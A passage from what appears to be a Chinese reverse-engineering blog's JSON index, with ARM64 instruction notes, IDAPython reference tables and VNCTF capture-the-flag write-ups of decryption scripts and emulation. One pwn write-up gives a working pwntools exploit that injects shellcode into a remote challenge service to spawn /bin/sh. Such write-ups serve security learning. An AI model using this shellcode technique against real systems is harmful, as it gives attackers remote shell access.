Rm）相乘，然后从一个累加值（Ra）中减去乘积，并将结果存储在目标寄存器 Rd 中。\n\n指令格式MSUB &lt;Rd&gt;, &lt;Rn&gt;, &lt;Rm&gt;, &lt;Ra&gt;\n\n参数说明\nRd 目标寄存器，用于存储最终的结果。\nRn 第一个乘数。\nRm 第二个乘数。\nRa 被减数（累加值）。\n\n工作原理计算乘积：\n\n将 Rn 和 Rm 相乘，得到乘积 P = Rn * Rm。减法操作：\n用累加值 Ra 减去乘积 P，即 Rd = Ra - P。存储结果：\n将最终结果存入目标寄存器 Rd。\n\n示例基本使用MSUB X0, X1, X2, X3\n\n计算 X0 = X3 - (X1 * X2)。\n\n示例操作假设：\n\nX1 = 4（第一个乘数）\nX2 = 3（第二个乘数）\nX3 = 20（累加值）\n\n执行：\nMSUB X0, X1, X2, X3\n\n结果：\n\nX0 = 20 - (4 * 3) = 20 - 12 = 8\n\n使用场景优化计算公式：\n\n避免单独执行乘法和减法指令，提高运算效率。\n可用于公式简化，如 c - (a * b)。\n\n数字信号处理（DSP）：\n\n常用于滤波、矩阵运算等需要大量乘法和减法操作的领域。\n\n图形计算：\n\n在图形处理的几何计算或物理仿真中，常需要计算某种形式的乘法和减法组合。\n\n与其他指令的比较\nMADD：执行乘法并加法（Rd = Ra + (Rn * Rm)）。\nMSUB：执行乘法并减法（Rd = Ra - (Rn * Rm)）。\nMUL：仅执行乘法。\nSMULL/UMULL：进行乘法并扩展结果为 64 位。\nSDIV/UDIV：执行有符号/无符号除法。\n\n注意事项数据类型：\n\nMSUB 适用于无符号和有符号整数运算。操作数的符号取决于数据的上下文。\n\n性能优化：\n\nMSUB 指令在 ARMv8-A 架构中是硬件加速的，避免了单独使用乘法和减法指令的额外指令开销。\n\nMSUB 是 ARM 指令集中重要的数学运算指令之一，适合处理多步骤运算，帮助开发者简化代码逻辑并提高执行效率。\nLDRSB 指令LDRSB 是 ARM 汇编中的一条指令，用于从内存加载一个字节，并将其符号扩展为 32 位或 64 位，然后存储到目标寄存器中。\n指令功能\nLDRSB（Load Register Signed Byte）会从指定的内存地址加载一个字节（8 位）数据。\n将加载的 8 位数据按照其符号位（第 7 位）扩展为：\n32 位（用于目标寄存器为 Wn）。\n64 位（用于目标寄存器为 Xn）。\n\n\n符号扩展表示：\n如果第 7 位为 0，高位填充为 0。\n如果第 7 位为 1，高位填充为 1。\n\n\n\n指令格式LDRSB &lt;Rt&gt;, [&lt;Rn&gt;{, #&lt;offset&gt;}]\n\n参数说明\nRt 目标寄存器，可以是 32 位（Wn）或 64 位（Xn）。\nRn 基址寄存器，提供内存地址。\noffset（可选）：偏移量，可以是立即数或寄存器值，用于计算内存地址。\n\n工作原理计算目标地址：\n\n从基址寄存器 Rn 读取地址。\n加上偏移量 offset（如果有）得到最终地址。从计算出的内存地址加载 8 位数据。符号扩展：\n根据字节的最高有效位（符号位，第 7 位）扩展到 32 位或 64 位。\n\n\n将结果存入目标寄存器 Rt。\n\n示例基本用法LDRSB W0, [X1]\n\n从 X1 指向的内存地址加载一个字节。\n符号扩展为 32 位。\n存入 W0。\n\n带偏移量LDRSB X2, [X3, #4]\n\n从 X3 + 4 的地址加载一个字节。\n符号扩展为 64 位。\n存入 X2。\n\n示例操作假设内存地址 0x1000 存储值 0xFF（8 位，表示 -1 的补码形式），并执行以下指令：\nLDRSB W0, [X1]\n\n\n假设 X1 = 0x1000。\n从内存 0x1000 加载字节值 0xFF。\n符号扩展：\n0xFF（8 位） -&gt; 0xFFFFFFFF（32 位，有符号 -1）。\n\n\n存入 W0，结果是 0xFFFFFFFF。\n\n如果目标寄存器为 Xn：\nLDRSB X0, [X1]\n\n\n符号扩展：\n0xFF（8 位）-&gt; 0xFFFFFFFFFFFFFFFF（64 位，有符号 -1）。\n\n\n存入 X0。\n\n使用场景处理有符号 8 位数据：\n\n如读取字符（char 类型）或设备寄存器的有符号数据。加载小范围整数：\n符号扩展后，可以直接参与算术运算而无需额外处理。低位处理：\n从内存中加载压缩格式的数据（如图像像素或音频样本）。\n\n注意事项符号扩展：\n\n目标寄存器的大小（Wn 或 Xn）决定符号扩展的结果位宽（32 位或 64 位）。对齐问题：\n由于加载的是一个字节，通常不需要严格的内存对齐，但基址和偏移量必须指向有效地址。内存访问异常：\n如果访问的地址无效或不可用，可能会触发异常。\n\n与其他加载指令的比较\nLDRB：无符号扩展加载字节（高位填充 0）。\n\nLDRSB：符号扩展加载字节（高位填充符号位）。\n\nLDR：加载 32 位或 64 位数据（不扩展）。\n\nLDRSH：符号扩展加载半字（16 位）。\n\nLDRSW：符号扩展加载字（32 位）。\n\n\nSTRB 指令STRB 是 ARM 汇编语言中用于将一个字节（8位）数据从寄存器存储到内存的指令。\n指令功能STRB 的全称是 Store Register Byte，它会将寄存器的低 8 位数据存储到内存中。\n指令格式STRB &lt;Rt&gt;, [&lt;Rn&gt;{, #&lt;offset&gt;}]\n\n参数说明\nRt 源寄存器，包含需要存储的数据（仅低 8 位会被存储）。\nRn 基址寄存器，指向内存地址的起始位置。\noffset（可选）：偏移量，指定从基址寄存器开始的内存偏移，单位为字节。\n\n工作原理从源寄存器 Rt 的低 8 位提取字节数据。计算目标内存地址：\n\n如果没有偏移量，直接使用基址寄存器 Rn。\n如果有偏移量，将 Rn 加上 offset 计算目标地址。将提取的 8 位数据存储到目标内存地址中。\n\n示例基本存储STRB W0, [X1]\n\n从 W0 中提取低 8 位数据（例如 0x34）。\n将其存储到 X1 指向的内存地址。\n\n带偏移的存储STRB W0, [X1, #4]\n\n从 W0 中提取低 8 位数据。\n将其存储到 X1 + 4 的内存地址。\n\n使用寄存器作为偏移STRB W0, [X1, X2]\n\n从 W0 中提取低 8 位数据。\n将其存储到 X1 + X2 的内存地址。\n\n示例操作假设：\n\nW0 = 0x12345678\nX1 = 0x1000\n偏移量为 #4\n\n执行：\nSTRB W0, [X1, #4]\n\n结果：\n\n提取 W0 的低 8 位：0x78。\n存储到地址 0x1000 + 4 = 0x1004。\n内存中：Mem[0x1004] = 0x78\n\n使用场景存储单字节数据：\n\n将 char 或其他 8 位数据类型存储到内存。低位数据处理：\n操作某个寄存器的低 8 位，将其写入设备寄存器或内存。性能优化：\n比完整的 32 位或 64 位存储更节省内存和带宽。\n\n注意事项存储的数据仅为低 8 位：\n\n只存储寄存器的低 8 位，忽略高 24 位（如果是 32 位寄存器）或高 56 位（如果是 64 位寄存器）。对齐和有效地址：\nARM 允许字节存储的非对齐访问，但目标地址必须是有效的内存地址。数据覆盖：\n确保存储的字节不会意外覆盖关键内存。\n\n相关指令\nLDRB 从内存加载一个字节数据到寄存器。\nSTR 存储一个完整的 32 位或 64 位值到内存。\nLDR 从内存加载一个完整的 32 位或 64 位值。\n\n","tags":["Reverse","ARM64","Assambly"]},{"title":"OLLVM 解混淆学习","url":"/2024/10/12/deollvm/","content":"学习 OLLVM 解混淆\n\n\n开坑中。。。。\n","tags":["Reverse","Android","DEOLLVM"]},{"title":"IDAPython 小记","url":"/2024/10/17/ida_python/","content":"记录一下 idapython 里面一些常用的数据类型\n\n\nop.type 类型和值对应表\n\n\n类型名称\n整数值\n描述\n\n\n\no_void\n0\n没有操作数。\n\n\no_reg\n1\n寄存器直接操作数。\n\n\no_mem\n2\n内存地址直接操作数（内存变量/全局变量地址）。\n\n\no_phrase\n3\n寄存器间接寻址。\n\n\no_displ\n4\n寄存器加偏移量（带偏移的间接寻址）。\n\n\no_imm\n5\n立即数操作数。\n\n\no_far\n6\n远跳转地址。\n\n\no_near\n7\n近跳转地址。\n\n\no_idpspec0\n8\n处理器特定的操作数类型 0（取决于 CPU 架构）。\n\n\no_idpspec1\n9\n处理器特定的操作数类型 1。\n\n\no_idpspec2\n10\n处理器特定的操作数类型 2。\n\n\no_idpspec3\n11\n处理器特定的操作数类型 3。\n\n\no_idpspec4\n12\n处理器特定的操作数类型 4。\n\n\no_idpspec5\n13\n处理器特定的操作数类型 5。\n\n\no_last\n14\n保留类型，不用于实际指令。\n\n\nop 的常用字段\n\n\n字段名\n描述\n\n\n\nop.type\n操作数的类型（整数值，对应 o_reg, o_imm 等类型）。\n\n\nop.addr\n内存地址（适用于 o_mem, o_displ, o_far, o_near 类型）。\n\n\nop.value\n立即数值（适用于 o_imm 类型）。\n\n\nop.reg\n寄存器编号（适用于 o_reg, o_phrase, o_displ 类型）。\n\n\nop.specval\n特殊值，通常与处理器架构相关，用于表示附加信息。\n\n\nop.offb\n偏移量的字节偏移（适用于 o_displ 和 o_phrase 类型）。\n\n\nop.dtype\n数据类型（例如 dt_byte, dt_word, dt_dword 等，用于区分数据的大小）。\n\n\nop.n\n操作数编号（0 表示第一个操作数，1 表示第二个操作数，以此类推）。\n\n\n每种 op.type 对应的字段说明\n\n\nop.type\n类型名称\n关键字段使用\n\n\n\no_void\n无操作数\n无字段使用。\n\n\no_reg\n寄存器\nop.reg: 寄存器编号。例如 eax。\n\n\no_mem\n内存地址\nop.addr: 内存地址（全局变量/内存变量）。\n\n\no_phrase\n寄存器间接寻址\nop.reg: 基础寄存器编号。 op.offb: 偏移量字节的偏移。\n\n\no_displ\n带偏移间接寻址\nop.reg: 基础寄存器编号。 op.addr: 偏移地址。 op.offb: 偏移量字节的偏移。\n\n\no_imm\n立即数\nop.value: 立即数值。\n\n\no_far\n远跳转\nop.addr: 跳转地址。 op.specval: 可能包含额外段选择器信息（视处理器架构而定）。\n\n\no_near\n近跳转\nop.addr: 跳转地址。\n\n\no_idpspec0-5\n处理器特定类型\nop.specval: 通常与具体的处理器架构相关，存储附加信息。\n\n\ninsn_t 的主要字段\n\n\n字段名\n类型\n描述\n\n\n\nea\nea_t\n指令的有效地址（Effective Address），即指令在程序中的位置。\n\n\nsize\nuint32\n指令的字节长度，以字节为单位。\n\n\nitype\nuint16\n指令类型/编号，表示该指令的操作（例如 mov, add 等）。\n\n\nauxpref\nuint32\n指令的辅助属性，用于存储与处理器架构相关的额外信息。\n\n\nsegpref\nuint16\n段相关属性，通常与分段架构的指令有关（例如 x86 分段寄存器）。\n\n\ninsnpref\nuint8\n指令前缀，表示指令的修饰信息（例如 rep, lock 等 x86 前缀）。\n\n\nflags\nuint16\n指令标志，表示该指令的一些状态（例如是否已被反汇编）。\n\n\nops\nop_t[UA_MAXOP]\n操作数数组，最多包含 UA_MAXOP（通常是 6 个）操作数。\n\n\n\ninsn_t 的关键字段详解\nea (Effective Address)：\n指令在内存中的地址。\n对于每条指令，ea 是其所在代码段中的偏移地址。\n例如，0x401000 表示该指令位于地址 0x401000。\n\n\nsize：\n当前指令的字节长度。\n例如，mov eax, ebx 在 x86 上可能占用 2 个字节（89 D8）。\n\n\nitype：\n指令类型，表示当前指令的操作。\n对应处理器架构定义的指令集枚举值，例如 x86 的 NN_mov（值为某个整数）。\n通过 idaapi.get_canon_mnem(insn.itype) 获取指令的助记符字符串。\n\n\nauxpref：\n辅助属性，用于存储指令的额外信息。\n例如，在 ARM 架构中，这可能包含条件码（如 EQ, NE）。\n\n\nsegpref：\n与分段架构相关的属性。\n在 x86 架构中，这可能表示段寄存器（如 CS, DS）。\n\n\ninsnpref：\n指令前缀信息。\n例如，x86 架构中使用的 rep 或 lock 前缀。\n\n\nflags：\n指令的标志信息。\n表示一些状态位，例如指令是否是合法的机器码。\n\n\nops：\n操作数数组，每个操作数是一个 op_t 类型。\n包含所有操作数的信息，如类型、值、地址等。\n最多支持 UA_MAXOP 个操作数（通常是 6 个）。\n\n\n\n寄存器编号与名称列表 (x86)\n\n\n编号\n寄存器名称\n\n\n\n0\neax\n\n\n1\necx\n\n\n2\nedx\n\n\n3\nebx\n\n\n4\nesp\n\n\n5\nebp\n\n\n6\nesi\n\n\n7\nedi\n\n\n8\neip\n\n\n9\nax\n\n\n10\ncx\n\n\n11\ndx\n\n\n12\nbx\n\n\n13\nsp\n\n\n14\nbp\n\n\n15\nsi\n\n\n16\ndi\n\n\n17\nal\n\n\n18\ncl\n\n\n19\ndl\n\n\n20\nbl\n\n\n21\nah\n\n\n22\nch\n\n\n23\ndh\n\n\n24\nbh\n\n\n寄存器编号与名称列表 (x64)\n\n\n编号\n寄存器名称\n\n\n\n0\nrax\n\n\n1\nrcx\n\n\n2\nrdx\n\n\n3\nrbx\n\n\n4\nrsp\n\n\n5\nrbp\n\n\n6\nrsi\n\n\n7\nrdi\n\n\n8\nr8\n\n\n9\nr9\n\n\n10\nr10\n\n\n11\nr11\n\n\n12\nr12\n\n\n13\nr13\n\n\n14\nr14\n\n\n15\nr15\n\n\n16\nrip\n\n\n17\neax\n\n\n18\necx\n\n\n19\nedx\n\n\n20\nebx\n\n\n21\nesp\n\n\n22\nebp\n\n\n23\nesi\n\n\n24\nedi\n\n\n25\nr8d\n\n\n26\nr9d\n\n\n27\nr10d\n\n\n28\nr11d\n\n\n29\nr12d\n\n\n30\nr13d\n\n\n31\nr14d\n\n\n32\nr15d\n\n\n33\nax\n\n\n34\ncx\n\n\n35\ndx\n\n\n36\nbx\n\n\n37\nsp\n\n\n38\nbp\n\n\n39\nsi\n\n\n40\ndi\n\n\n41\nr8w\n\n\n42\nr9w\n\n\n43\nr10w\n\n\n44\nr11w\n\n\n45\nr12w\n\n\n46\nr13w\n\n\n47\nr14w\n\n\n48\nr15w\n\n\n49\nal\n\n\n50\ncl\n\n\n51\ndl\n\n\n52\nbl\n\n\n53\nah\n\n\n54\nch\n\n\n55\ndh\n\n\n56\nbh\n\n\n57\nr8b\n\n\n58\nr9b\n\n\n59\nr10b\n\n\n60\nr11b\n\n\n61\nr12b\n\n\n62\nr13b\n\n\n63\nr14b\n\n\n64\nr15b\n\n\n","tags":["Reverse","IDAPython"]},{"url":"/2025/02/09/vnctf/","content":"Hook Fishhook 以下 fish_fade 方法，防止删掉 dex\nJava.perform(() =&gt; &#123;    let MainActivity = Java.use(&quot;com.example.hihitt.MainActivity&quot;);    MainActivity[&quot;fish_fade&quot;].implementation = function () &#123;        console.log(`MainActivity.fish_fade is called`);        // this[&quot;fish_fade&quot;]();    &#125;;&#125;)\n\n然后写解密脚本\n\npublic static String decrypt(String str) &#123;    char[] str1 = str.toCharArray();    System.out.println(Arrays.toString(str1));    for (int i = 0; i &lt; str1.length; i++) &#123;        if (str1[i] &gt;= &#x27;0&#x27; &amp;&amp; str1[i] &lt;= &#x27;8&#x27;) &#123;            str1[i] = (char) ((str1[i] + &#x27;1&#x27;) - (i % 4));        &#125; else &#123;            str1[i] = (char) ((str1[i] - &#x27;7&#x27;) - (i % 10));        &#125;    &#125;    code(str1, 0);    String newStr = new String(str1);    char[] str12 = new char[newStr.length() / 2];    for (int i = 0; i &lt; newStr.length(); i += 2) &#123;        str12[i / 2] = (char) (Integer.parseInt(newStr.substring(i, i + 2), 16) - 68);    &#125;    System.out.println(new String(str12));    return &quot;&quot;;&#125;\n\n\n\nFuko’s starfish直接 Process-dump https://github.com/glmcdona/Process-Dump\n\n标准 aes 找到 key 异或一下 0x17 就行了\n\n\n拿出来跑一下 cyberchef 解密就行了\n\nkotlindroid修改 JNI 的 smali，打印 add\n\n原样解密就行\npublic static byte[] decrypt(byte[] encryptedData, byte[] key) throws Exception &#123;    byte[] iv = new byte[6];    byte[] ciphertext = new byte[encryptedData.length - 6];    System.arraycopy(encryptedData, 0, iv, 0, 6);    System.arraycopy(encryptedData, 6, ciphertext, 0, ciphertext.length);    GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, iv);    SecretKey secretKey = new SecretKeySpec(key, &quot;AES&quot;);    Cipher cipher = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);    cipher.init(Cipher.DECRYPT_MODE, secretKey, gcmParameterSpec);    cipher.updateAAD(&quot;mysecretadd&quot;.getBytes());    byte[] plaintext = cipher.doFinal(ciphertext);    return plaintext;&#125;public static void main(String[] args) &#123;    try &#123;        System.out.println(new String(decrypt(Base64.getDecoder().decode(&quot;MTE0NTE0HMuJKLOW1BqCAi2MxpHYjGjpPq82XXQ/jgx5WYrZ2MV53a9xjQVbRaVdRiXFrSn6EcQPzA==&quot;), &quot;atrikeyssyekirta&quot;.getBytes())));    &#125; catch (Exception e) &#123;        e.printStackTrace();    &#125;&#125;\n\nVNCTF&#123;Y0U_@re_th3_Ma5t3r_0f_C0mp0s3&#125;\n抽奖转盘native 里面一个魔改 RC4(多异或了 0x40) 和 标准base64，每个字符还加了 3，ark 层每个字符异或七减一，RC4密钥 Take_it_easy，密文以 bytebuffer 的形式存在，找不到字符串\n#include &quot;stdio.h&quot;#include &quot;defs.h&quot;//s表的长度取256#define size 256unsigned char sbox[257] = &#123;0&#125;;unsigned char kbox[257] = &#123;0&#125;;//初始化s表void init_sbox(unsigned char *key, int keyLen) &#123;    unsigned int i, j, k;    int tmp;    for (i = 0; i &lt; size; i++) &#123;        sbox[i] = i;        kbox[i] = key[i % keyLen];    &#125;    int v10 = 0;    for (int j = 0; j &lt; 256; ++j) &#123;        v10 = (v10 + sbox[j] + kbox[j]) % 256;        tmp = sbox[j];        sbox[j] = sbox[v10];        sbox[v10] = tmp;    &#125;&#125;//加解密函数void enc_dec(unsigned char *key, unsigned char *data, int strLen, int dataLen) &#123;    int i, j, k, R, tmp;    init_sbox(key, strLen);    j = k = 0;    for (i = 0; i &lt; dataLen; i++) &#123;        j = (j + 1) % size;        k = (k + sbox[j]) % size;        tmp = sbox[j];        sbox[j] = sbox[k];        sbox[k] = tmp;        R = sbox[(sbox[j] + sbox[k]) % size];        data[i] ^= R;        data[i] ^= 40;    &#125;&#125;uint8 aAbcdefghijklmn[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;int main()&#123;    uint8 data2[] = &#123;            101, 74, 76, 49, 101, 76, 117, 87, 55, 69, 118, 68, 118, 69, 55, 67, 61, 83, 62, 111, 81, 77, 115, 101, 53, 73, 83, 66, 68, 114, 109, 108, 75, 66, 97, 117, 93, 127, 115, 124, 109, 82, 93, 115    &#125;;    for (int i = 0; i &lt; 44; ++i) &#123;        data2[i] = (data2[i] ^ 7) - 1;        printf(&quot;%c&quot;, data2[i]);    &#125;    printf(&quot;\\n&quot;);    uint8 data[] = &#123;            0x68,0xb2,0x79,0x68,0x9a,0x8e,0xfc,0x0a,0x41,0xa4,0x0f,0xc2,0xf5,0x2f,0x20,0x50,0x8b,0x1a,0xd4,0xc4,0x83,0x06,0xd8,0xa3,0x28,0x37,0xaa,0x63,0x0b,0x33,0x89,0x36,0x2c    &#125;;    uint8 key[] = &quot;Take_it_easy&quot;;    enc_dec(key, data, 12, 33);    for (int i = 0; i &lt; 33; ++i) &#123;        printf(&quot;%c&quot;, data[i] - 3);    &#125;    // Take_it_easy    return 0;&#125;\n\nVNCTF&#123;JUst_$ne_Iast_dance_2025!&#125;\nAndroidLuxbusybox + proot + libexecute劫持libc函数 + 两处花指令\n\nbase64魔改了表分组模式，第一组六个正常取，剩下的和原版比起来等同于循环左移2bit\nsocket 的 recv 被魔改了 每个字节异或 1，strncmp 多了个 rot13\n\n\n#include &quot;bits/stdc++.h&quot;#include &quot;defs.h&quot;unsigned char base64[65] = &#123;        0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69,        0x6A, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x47, 0x48, 0x49,        0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70,        0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x30, 0x31, 0x32, 0x33, 0x2B, 0x2F,        0x00&#125;;unsigned __int8 *encodeBase64(unsigned __int8 *a1, int a2) &#123;    int v3; // w0    int v4; // w1    int v5; // w1    int v6; // w0    int v7; // w1    int v8; // w0    unsigned __int8 *result; // x0    _BYTE *v13; // [xsp+58h] [xbp+58h]    int size_4; // [xsp+68h] [xbp+68h]    int size_4a; // [xsp+68h] [xbp+68h]    int v16; // [xsp+6Ch] [xbp+6Ch]    sqrt((double) 25);    v16 = 0;    if (a2 % 3)        v3 = 4;    else        v3 = 0;    v13 = (uint8 *) malloc(4 * (a2 / 3) + 1 + v3);    for (size_4 = 0; size_4 &lt; a2; ++size_4) &#123;        if (a2 - size_4 &lt;= 2) &#123;            v13[v16] = base64[a1[size_4] &gt;&gt; 2];            if (a2 - size_4 == 2) &#123;                v7 = a1[size_4++] &amp; 3;                v13[v16 + 1] = base64[v7 | ((int) a1[size_4] &gt;&gt; 2) &amp; 0x3C];                v13[v16 + 2] = base64[a1[size_4] &amp; 0xF];            &#125; else &#123;                v13[v16 + 1] = base64[a1[size_4] &amp; 3];                v13[v16 + 2] = 61;            &#125;            v8 = v16 + 3;            v16 += 4;            v13[v8] = 61;        &#125; else &#123;            v13[v16] = base64[a1[size_4] &gt;&gt; 2];            v4 = a1[size_4] &amp; 3;            size_4a = size_4 + 1;            v13[v16 + 1] = base64[v4 | ((int) a1[size_4a] &gt;&gt; 2) &amp; 0x3C];            v5 = a1[size_4a] &amp; 0xF;            size_4 = size_4a + 1;            v13[v16 + 2] = base64[v5 | (16 * (a1[size_4] &gt;&gt; 6))];            v6 = v16 + 3;            v16 += 4;            v13[v6] = base64[a1[size_4] &amp; 0x3F];        &#125;    &#125;    v13[v16] = 0;    return v13;&#125;void printBinary(unsigned char num) &#123;    // 假设 int 是 32 位    for (int i = 7; i &gt;= 0; i--) &#123;        // 通过右移操作获取每一位的值        int bit = (num &gt;&gt; i) &amp; 1;        printf(&quot;%d&quot;, bit);    &#125;    printf(&quot;\\n&quot;);&#125;unsigned char *decodeBase64(char *str, int len) &#123;    char ascill[129];    int k = 0;    for (int i = 0; i &lt; 64; i++) &#123;        ascill[base64[i]] = k++;    &#125;    int decodeStrlen = len / 4 * 3 + 1;    unsigned char *decodeStr = (unsigned char *) malloc(sizeof(char) * decodeStrlen);    k = 0;    for (int i = 0; i &lt; len; i++) &#123;        decodeStr[k++] = (ascill[str[i]] &lt;&lt; 2) | (ascill[str[++i]] &amp; 0x3);        if (str[i + 1] == &#x27;=&#x27;) &#123;            break;        &#125;        printf(&quot;%d %d\\n&quot;, ascill[str[i]], (ascill[str[i]] &gt;&gt; 2));        decodeStr[k++] = ((ascill[str[i]] &gt;&gt; 2) &lt;&lt; 4) | (ascill[str[++i]] &amp; 0xF);        if (str[i + 1] == &#x27;=&#x27;) &#123;            break;        &#125;        decodeStr[k++] = (((ascill[str[i]] &amp; 0x30) &gt;&gt; 4) &lt;&lt; 6) | (ascill[str[++i]]);    &#125;    for (int i = 0; i &lt; decodeStrlen; ++i) &#123;        printBinary(decodeStr[i]);    &#125;    printf(&quot;\\n&quot;);    decodeStr[k] = &#x27;\\0&#x27;;    return decodeStr;&#125;int main() &#123;    // 68GJ6HdqffYuffYqhfTyhgTrImPtTU==    // 68GJ6HdqffYuffYqhfTyhgTrIT==    int8 data2[25] = &#123;&#125;;    strcpy(data2, &quot;VNCTF&#123;Youregoodatreverse&#125;&quot;);    uint8 *out2 = encodeBase64((uint8 *) data2, 25);//    printf(&quot;%s\\n&quot;, out2);    int8 data[] = &quot;ECIVEA40E9CH67hr6EHU88Etf65Oc8gq8IDz4FCNG8Xw97DtIT==&quot;;    uint8 *ptr = decodeBase64((int8 *) data, strlen((int8 *) data));    for (int i = 0; i &lt; 37; ++i) &#123;        ptr[i] ^= 1;    &#125;    printf(&quot;%s\\n&quot;, ptr);    return 0;&#125;\n\nVNCTF&#123;Ur_go0d_@ndr0id&amp;l1nux_Reve7ser&#125;\nVN_Lang直接 strings 就行了\n签个到吧写两次 shellcode 第一次构造 read 延长输入，第二次直接 getshell\nfrom pwn import *import timecontext(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)&#x27;&#x27;&#x27;mov rsi, rdixor rdi, rdimov rdx, 0x1000syscall&#x27;&#x27;&#x27;payload = b&quot;\\x48\\x89\\xFE\\x48\\x31\\xFF\\x48\\xC7\\xC2\\x00\\x10\\x00\\x00\\x0F\\x05&quot;p = remote(&quot;node.vnteam.cn&quot;, 47847)# gdb.attach(p, &quot;b *$rebase(0x1212)&quot;)# pause()p.sendlineafter(b&quot;try to show your strength&quot;, payload)time.sleep(1)&#x27;&#x27;&#x27;mov rdi, rsixor rsi, rsixor rdx, rdxmov al, 59syscall&#x27;&#x27;&#x27;p.sendline(b&quot;/bin/sh\\x00&quot;.ljust(len(payload), b&quot;\\x00&quot;) + b&quot;\\x48\\x89\\xF7\\x48\\x31\\xF6\\x48\\x31\\xD2\\xB0\\x3B\\x0F\\x05&quot;)p.interactive()\n\n"},{"title":"台州市赛 - Reverse 方向","url":"/2024/10/16/taizhou/","content":"台州市赛 Reverse 方向\n\nnanomites主函数\n查看函数 sub_40195C这里使用了Windows API中的CreateProcessA和WaitForDebugEvent等函数。创建了一个新的进程并进入调试模式，通过处理调试事件（如创建线程、异常、退出等）来控制进程的执行\n\n这里利用 dwDebugEventCode 来执行程序逻辑常见的 dwDebugEventCode 事件类型及其对应的常量值如下：\n\nEXCEPTION_DEBUG_EVENT (值：1)：\n表示一个异常发生了。调试器可以捕获各种类型的异常，包括访问冲突、除零、断点异常等。异常信息保存在 DEBUG_EVENT.u.Exception 中。\n\n\nCREATE_THREAD_DEBUG_EVENT (值：2)：\n表示被调试的进程创建了一个新的线程。调试器可以通过该事件获取新线程的句柄。线程信息保存在 DEBUG_EVENT.u.CreateThread 中。\n\n\nCREATE_PROCESS_DEBUG_EVENT (值：3)：\n表示被调试的进程启动。此事件发生在调试器启动的进程开始运行时。进程信息（如句柄）保存在 DEBUG_EVENT.u.CreateProcessInfo 中。\n\n\nEXIT_THREAD_DEBUG_EVENT (值：4)：\n表示一个线程已经退出。调试器可以使用这个事件来清理和跟踪已退出的线程。退出信息保存在 DEBUG_EVENT.u.ExitThread 中。\n\n\nEXIT_PROCESS_DEBUG_EVENT (值：5)：\n表示被调试的进程已经退出。调试器可以使用这个事件来获取进程的退出码并进行清理工作。退出信息保存在 DEBUG_EVENT.u.ExitProcess 中。\n\n\nLOAD_DLL_DEBUG_EVENT (值：6)：\n表示被调试的进程加载了一个新的动态链接库（DLL）。调试器可以使用这个事件来获取DLL的句柄和路径。DLL信息保存在 DEBUG_EVENT.u.LoadDll 中。\n\n\n\n核心加密逻辑是 case1 那个 EXCEPTION_DEBUG_EVENT 后面会讲到，我们一步一步看我们看另外一个函数 sub_401C38\n\n这里有一个运行时载入代码，我们把 unk_412020 导出然后 使用 ida 分析\n\n可以看到主要逻辑是把传入的输入的数据加载一个字节到 r12 寄存器，然后对 r11 寄存器进行复制异或和循环位移，然后关键是 ud2 指令，这个是抛出异常，再联想到上面 EXCEPTION_DEBUG_EVENT就可以知道加密逻辑了\n\nsub_401584是加密函数，密文在 r11 寄存器中，然后只比较 r13 寄存器为 1 的情况，上面那么多 r13 为 0 的情况是假的把上面 dump 出来的热加载的 shellcode disasm 然后用 python 提取出含有 mov r13, 1 的片段，然后我们就得计算出每个片段对应的 r11 值，也就是密文，这里考虑到精度，使用 unicorn 计算比较好\nfrom unicorn import *from unicorn.x86_const import *import remu = Uc(UC_ARCH_X86, UC_MODE_64)ADDRESS = 0x1000mu.mem_map(ADDRESS, 2 * 1024 * 1024)f = open(\"asm.txt\", \"r\").read()def executer(imm1, imm2, imm3):    mov_r11 = b'\\x49\\xbb' + imm1.to_bytes(8, byteorder='little')    xor_r11 = b'\\x49\\x81\\xf3' + imm2.to_bytes(4, byteorder='little')    ror_r11 = b'\\x49\\xc1\\xcb' + imm3.to_bytes(1, byteorder='little')    CODE = mov_r11 + xor_r11 + ror_r11    mu.mem_write(ADDRESS, CODE)    mu.reg_write(UC_X86_REG_R11, 0)  # 初始化 R11 寄存器    mu.emu_start(ADDRESS, ADDRESS + len(CODE))    r11_value = mu.reg_read(UC_X86_REG_R11)    return r11_valueresult = []sp = f.split(\"; ---------------------------------------------------------------------------\\n\")for part in sp:    pt = [_.strip() for _ in part.split(\"\\n\")[:-1]]    symbol = pt[4]    if symbol == \"mov     r13, 1\":        num1 = int(\"0x\" + re.findall(r\"[\\dA-Z]+h\", pt[1])[0][:-1], 16)        num2 = int(\"0x\" + re.findall(r\"[\\dA-Z]+h\", pt[2])[0][:-1], 16)        num3 = int(\"0x\" + re.findall(r\"[\\dA-Z]+h\", pt[3])[0][:-1], 16)        result.append(executer(num1, num2, num3))        # print(f\"{num1:#x}, {num2:#x}, {num3:#x}, {result[-1]: #x}\")        for enc in result:    print(f\"{enc:#x}, \", end=\"\")\n\n得到密文表\n[0x84db9614, 0x174760d3, 0x7ac80e2c, 0x3194ec2e, 0x70a549c3, 0x41dedf66, 0x7f69c81e, 0x37b76e13, 0x37b76e13, 0x41dedf66, 0xb99d68d8, 0xcfef5b0b, 0x174760d3, 0xb78ac2e7, 0xea1b9f56, 0xee54ef8e, 0x174760d3, 0xb99d68d8, 0xf2475372, 0xdc310a37, 0xee54ef8e, 0x37b76e13, 0x3194ec2e, 0x37b76e13, 0xea1b9f56, 0xee54ef8e, 0xb99d68d8, 0xea1b9f56, 0xb78ac2e7, 0x9d07d8da, 0xee54ef8e, 0x41dedf66, 0x8288d321, 0x174760d3, 0x9d07d8da, 0x174760d3, 0x8288d321, 0xdc310a37, 0x45e26648, 0x41dedf66, 0x8288d321, 0x8288d321, 0x930b26e3, 0xabef6fef]\n\n观察异常处理中的加密函数\n\n是一系列较为复杂的位移操作，应该是可以解的，但是笔者采取了一个投巧的方法，用x64dbg下断在 0x0000000000401862\n\n由于可视字符太多，所以笔者写了一个脚本来自动打印到日志\nrun                               log 